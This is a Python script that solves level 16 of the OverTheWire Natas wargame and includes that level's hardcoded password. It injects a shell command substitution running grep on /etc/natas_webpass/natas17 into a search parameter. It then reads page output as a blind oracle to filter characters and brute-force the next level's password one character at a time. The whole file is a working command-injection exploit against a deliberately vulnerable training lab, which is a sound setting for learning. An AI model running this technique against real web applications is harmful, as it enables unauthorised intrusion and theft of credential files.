import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
filtered_chars = ""
final_pass = ""

print("Filtering chars...")
for c in chars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed%24%28grep+'+c+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search', auth=(username, password))
    if ("doomed" not in r.text):
        filtered_chars += c

print("filtered_chars: "+filtered_chars)

for i in range(32):
    for x in filtered_chars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed%24%28grep+^'+final_pass+x+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search', auth=(username, password))
        if ("doomed" not in r.text):
            final_pass = final_pass + x
            print(final_pass)
            break

print("final_pass: "+final_pass)